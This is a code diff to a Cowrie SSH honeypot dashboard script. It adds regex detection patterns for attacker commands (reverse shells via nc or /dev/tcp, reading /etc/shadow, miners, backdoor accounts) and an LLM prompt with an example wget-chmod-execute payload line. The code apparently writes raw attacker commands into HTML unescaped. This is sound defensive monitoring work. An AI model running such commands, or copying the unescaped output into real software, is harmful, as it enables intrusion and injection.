@@ -5,6 +5,7 @@ Parses Cowrie JSON logs, does GeoIP lookups, generates a self-contained HTML das
 """
 
 import json
+import re
 import glob
 import hashlib
 import os
@@ -21,6 +22,114 @@ LOG_PATH = "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
 CACHE_PATH = os.path.join(SCRIPT_DIR, "geoip_cache.json")
 OUTPUT_PATH = os.path.join(SCRIPT_DIR, "dashboard.html")
 
+
+
+def annotate_command(cmd):
+    """Layer 1: Dictionary lookup for command annotations. Returns short technical note or None."""
+    cmd_stripped = cmd.strip()
+    cmd_lower = cmd_stripped.lower()
+    
+    # Exact/prefix matches first
+    annotations = {
+        "uname -a": "OS/kernel identification",
+        "uname": "OS identification",
+        "cat /etc/passwd": "user enumeration",
+        "cat /etc/shadow": "password hash extraction",
+        "cat /proc/cpuinfo": "CPU profiling",
+        "cat /proc/meminfo": "memory profiling",
+        "cat /proc/version": "kernel version check",
+        "free -m": "RAM check",
+        "free -h": "RAM check",
+        "free": "RAM check",
+        "df -h": "disk space check",
+        "df": "disk space check",
+        "lscpu": "CPU architecture scan",
+        "nproc": "core count check",
+        "dmidecode": "hardware inventory",
+        "lspci": "PCI device enumeration",
+        "lsblk": "block device enumeration",
+        "lsusb": "USB device scan",
+        "ifconfig": "network mapping",
+        "ip addr": "network mapping",
+        "ip a": "network mapping",
+        "ip route": "routing table check",
+        "hostname": "hostname discovery",
+        "hostname -I": "IP address discovery",
+        "whoami": "privilege check",
+        "id": "privilege check",
+        "w": "logged-in users check",
+        "who": "logged-in users check",
+        "last": "login history check",
+        "uptime": "uptime check",
+        "ps aux": "process enumeration",
+        "ps -ef": "process enumeration",
+        "top": "process monitoring",
+        "netstat -tulpn": "open ports scan",
+        "ss -tulpn": "open ports scan",
+        "mount": "mounted filesystem check",
+        "dmesg": "kernel message dump",
+        "env": "environment variable dump",
+        "printenv": "environment variable dump",
+        "history": "history snooping",
+        "cat ~/.bash_history": "history snooping",
+        "cat /root/.bash_history": "history snooping",
+    }
+    
+    # Check exact matches
+    if cmd_lower in annotations:
+        return annotations[cmd_lower]
+    
+    # Pattern-based matches (order matters — more specific first)
+    patterns = [
+        (r'export\s+HISTFILE\s*=\s*/dev/null', "anti-forensics: disable history"),
+        (r'unset\s+HISTFILE', "anti-forensics: disable history"),
+        (r'export\s+HISTSIZE\s*=\s*0', "anti-forensics: disable history"),
+        (r'HISTORY.*=/dev/null', "anti-forensics: disable history"),
+        (r'/bin/\./\w+', "obfuscated system check"),
+        (r'cat\s+/etc/passwd', "user enumeration"),
+        (r'cat\s+/etc/shadow', "password hash extraction"),
+        (r'cat\s+/proc/cpuinfo', "CPU profiling"),
+        (r'wget\s+https?://', "payload download from C2"),
+        (r'curl\s+https?://', "payload download"),
+        (r'curl\s+-[sOo]', "payload download"),
+        (r'tftp\s+', "payload download via TFTP"),
+        (r'chmod\s+\+x', "make executable"),
+        (r'chmod\s+[0-7]*7[0-7]*\s+', "make executable (world)"),
+        (r'^\.\/', "execute payload"),
+        (r'/tmp/\w+', "execute from /tmp"),
+        (r'crontab', "persistence setup"),
+        (r'/etc/cron', "persistence setup"),
+        (r'iptables', "firewall tampering"),
+        (r'ufw\s+', "firewall tampering"),
+        (r'systemctl', "service manipulation"),
+        (r'service\s+', "service manipulation"),
+        (r'rm\s+-rf\s+/', "destructive wipe attempt"),
+        (r'rm\s+.*\.log', "log cleanup"),
+        (r'pkill|killall|kill\s+-9', "process termination"),
+        (r'useradd|adduser', "create backdoor account"),
+        (r'passwd\s+', "password change attempt"),
+        (r'ssh-keygen|authorized_keys', "SSH key persistence"),
+        (r'nc\s+-[le]|ncat|netcat', "reverse shell / listener"),
+        (r'/dev/tcp/', "bash reverse shell"),
+        (r'base64\s+-d|base64\s+--decode', "decode obfuscated payload"),
+        (r'python.*-c.*import', "Python one-liner execution"),
+        (r'perl\s+-e', "Perl one-liner execution"),
+        (r'xmrig|minerd|ccminer|cpuminer', "cryptominer deployment"),
+        (r'\.bash_history', "history snooping"),
+        (r'history', "history snooping"),
+        (r'dd\s+if=', "disk operation"),
+        (r'echo\s+.*>\s*/etc/', "system file modification"),
+        (r'echo\s+.*>>\s*/etc/', "system file append"),
+        (r'apt\s+install|yum\s+install|pip\s+install', "package installation"),
+        (r'docker\s+', "container manipulation"),
+        (r'chattr\s+', "file attribute tampering"),
+    ]
+    
+    for pattern, note in patterns:
+        if re.search(pattern, cmd_lower):
+            return note
+    
+    return None
 
 def parse_log(path):
     """Parse Cowrie JSON log, skipping malformed lines."""
@@ -212,6 +321,7 @@ def analyze_events(events, geo_cache):
     successful_sessions = defaultdict(list)  # session -> commands
     session_ips = {}
     session_success = set()
+    session_creds = {}
 
     # Per-day tracking
     EST = timezone(timedelta(hours=-5))
@@ -293,6 +403,7 @@ def analyze_events(events, geo_cache):
             ip_creds[ip].append(combo)
             cred_combos[combo] += 1
             session_success.add(session)
+            session_creds[session] = f"{u}/{p}"
             if day_key:
                 daily_login_attempts[day_key] += 1
                 daily_successful[day_key] += 1
@@ -409,7 +520,7 @@ def analyze_events(events, geo_cache):
     success_data = []
     for sid, cmds in successful_sessions.items():
         ip = session_ips.get(sid, "?")
-        success_data.append({"session": sid, "ip": ip, "commands": cmds})
+        success_data.append({"session": sid, "ip": ip, "commands": cmds, "creds": session_creds.get(sid, "unknown")})
     # Sort by first command timestamp, most recent first
     success_data.sort(key=lambda s: s["commands"][0]["ts"] if s["commands"] else "", reverse=True)
 
@@ -718,29 +829,71 @@ def classify_commands_fast(cmds):
     return None  # Complex enough to warrant LLM
 
 def generate_command_explanations(data):
-    """Generate explanations for commands in successful sessions. Uses fast pattern matching
-    for common behaviors, LLM only for genuinely interesting/complex sessions."""
+    """Generate explanations for commands in successful sessions.
+    3-layer system: Layer 2 (pattern match) → Layer 3 (LLM for novel, cached)."""
     explained = []
-    llm_count = 0
-    MAX_LLM_CALLS = 8  # Cap LLM calls to keep generation fast on CPU
+    desc_cache = load_cache()
+    geo_cache = data.get("geo_cache", {})
+    ip_creds_map = data.get("ip_creds", {})
     
-    seen_ips = {}  # ip -> count, to vary descriptions for repeat visitors
+    llm_calls = 0
+    MAX_LLM_CALLS = 15  # Cap fresh LLM calls per run (cached ones are free)
     for s in data.get("successful_sessions", []):
-        geo = data.get("geo_cache", {}).get(s["ip"], {})
-        ip_creds_map = data.get("ip_creds", {})
+        geo = geo_cache.get(s["ip"], {})
         nick = generate_nickname(s["ip"], geo, ip_creds_map.get(s["ip"], []))
         cmds = [c["cmd"] for c in s["commands"]]
+        creds_used = s.get("creds", "")
         if not cmds:
             continue
         
-        # Track how many times we've seen this IP
-        seen_ips[s["ip"]] = seen_ips.get(s["ip"], 0) + 1
+        cmd_str = "; ".join(cmds[:10])
+        cmd_hash = hashlib.md5(cmd_str.encode()).hexdigest()[:8]
+        cache_key = f"cmd_{s['ip']}_{cmd_hash}"
+        
+        if cache_key in desc_cache:
+            # Layer 0: cached result (from any previous layer)
+            explanation = desc_cache[cache_key]
+        else:
+            # Layer 2: try pattern matching first (instant)
+            explanation = classify_commands_fast(cmds)
+            
+            if explanation is None:
+                # Layer 3: LLM for novel/complex sessions
+                if llm_calls < MAX_LLM_CALLS:
+                    llm_calls += 1
+                    country = geo.get("country", "Unknown")
+                    isp = geo.get("isp", "Unknown")
+                    prompt = f"""SSH honeypot session one-liner. Be specific and technical about what the attacker did.
 
-        # Use fast pattern matching only - LLM too slow/unreliable on CPU
-        explanation = classify_commands_fast(cmds)
-        if explanation is None:
-            explanation = "Got in, ran some commands, left."
+Session: root logged in, ran: uname -a; cat /proc/cpuinfo; free -m; df -h
+→ Full system profiling: OS version, CPU specs, available RAM and disk. Evaluating this box as a cryptomining candidate.
 
+Session: deploy logged in, ran: wget http://45.33.1.2/x86; chmod 777 x86; ./x86
+→ Payload delivery: fetched and executed a binary from a C2 server. Likely a Mirai variant or cryptominer dropper.
+
+Session: {creds_used} logged in, ran: {cmd_str}
+→"""
+                    explanation = llm_generate(prompt, temperature=0.7, max_tokens=40)
+                    # Filter out bad LLM outputs
+                    bad = False
+                    if not explanation or len(explanation) < 10:
+                        bad = True
+                    elif any(explanation.lower().startswith(p) for p in ["here", "i can", "we ", "okay", "the attacker", "this command", "this is", "let me", "it looks", "the user", "sure", "session", "payload:"]):
+                        bad = True
+                    elif any(x in explanation.lower() for x in ["honeypot", "127.0.0.1", "as an ai", "i apologize"]):
+                        bad = True
+                    elif len(explanation.split()) < 4:
+                        bad = True
+                    if bad:
+                        explanation = None
+                
+                # Fallback if LLM failed or over cap
+                if not explanation:
+                    explanation = "Got in, ran some commands, left."
+            
+            # Cache permanently
+            desc_cache[cache_key] = explanation
+        
         explained.append({
             "nick": nick,
             "ip": s["ip"],
@@ -748,6 +901,7 @@ def generate_command_explanations(data):
             "explanation": explanation,
         })
 
+    save_cache(desc_cache)
     return explained
 
 
@@ -833,7 +987,9 @@ def generate_html(data):
             terminal_content += f'<div class="term-header">🎭 <span class="nick-link" onclick="flyToAttacker(&quot;{nick}&quot;)">{nick}</span> ({s["ip"]}) — {loc} <span style="color:#555;font-size:0.85em">· {first_ts}</span></div>\n'
             terminal_content += f'<div class="term-line" style="color:#ff9944;font-style:italic;">💡 {s["explanation"]}</div>\n'
             for cmd in s["commands"]:
-                terminal_content += f'<div class="term-line"><span class="term-prompt">{nick}@honeypot:~$ </span>{cmd["cmd"]}</div>\n'
+                annotation = annotate_command(cmd["cmd"])
+                note_html = f' <span class="cmd-note">// {annotation}</span>' if annotation else ''
+                terminal_content += f'<div class="term-line"><span class="term-prompt">{nick}@honeypot:~$ </span>{cmd["cmd"]}{note_html}</div>\n'
     elif data["successful_sessions"]:
         for s in data["successful_sessions"]:
             geo = geo_cache.get(s["ip"], {})
@@ -844,7 +1000,9 @@ def generate_html(data):
             terminal_content += f'<div class="term-header">🎭 <span class="nick-link" onclick="flyToAttacker(&quot;{nick}&quot;)">{nick}</span> ({s["ip"]}) — {loc}</div>\n'
             for cmd in s["commands"]:
                 ts_short = cmd["ts"][:19].replace("T", " ") if cmd["ts"] else ""
-                terminal_content += f'<div class="term-line"><span class="term-prompt">{nick}@honeypot:~$ </span>{cmd["cmd"]}</div>\n'
+                annotation = annotate_command(cmd["cmd"])
+                note_html = f' <span class="cmd-note">// {annotation}</span>' if annotation else ''
+                terminal_content += f'<div class="term-line"><span class="term-prompt">{nick}@honeypot:~$ </span>{cmd["cmd"]}{note_html}</div>\n'
     else:
         terminal_content = '<div class="term-line" style="color:#666;">No successful logins captured yet. The bots are still trying...</div>'
 
@@ -1167,6 +1325,13 @@ def generate_html(data):
     padding-bottom: 3px;
   }}
   .term-line {{ color: #00ff41; margin: 2px 0; }}
+  .cmd-note {{
+    color: #0a8;
+    font-style: italic;
+    font-size: 0.85em;
+    opacity: 0.7;
+    margin-left: 8px;
+  }}
   .term-prompt {{ color: #ff6b6b; }}
 
   .leaflet-popup-content-wrapper {{
